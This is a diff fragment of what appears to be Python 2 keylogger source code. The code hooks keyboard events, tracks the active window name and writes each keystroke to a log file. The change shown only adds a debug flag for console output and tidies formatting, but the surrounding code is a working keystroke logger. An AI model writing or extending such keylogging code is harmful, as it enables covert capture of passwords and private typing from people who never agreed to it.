@@ -21,6 +21,8 @@ log_file='file.log'
 current_window=""
 #var of the open file
 of=""
+#debug boolean, to print in the console too
+debug=True
 
 def printOnFile(string):
 	global of
@@ -29,7 +31,8 @@ def printOnFile(string):
 	
 #for debug use
 def printOnConsole(string):
-	print string
+	if debug:
+		print string
 	
 #get current date time
 def getDate():
@@ -40,10 +43,9 @@ def OnKeyPressConsol(event):
 	global current_window
 	key = ""
 	if event.Ascii==0:
-		#to divide from normal test
 		key=" %s" % event.Key
 	else:
-		key=" %s" %event.Key
+		key=" %s" % event.Key
 	
 	if current_window==event.WindowName:
 		printOnFile(key)
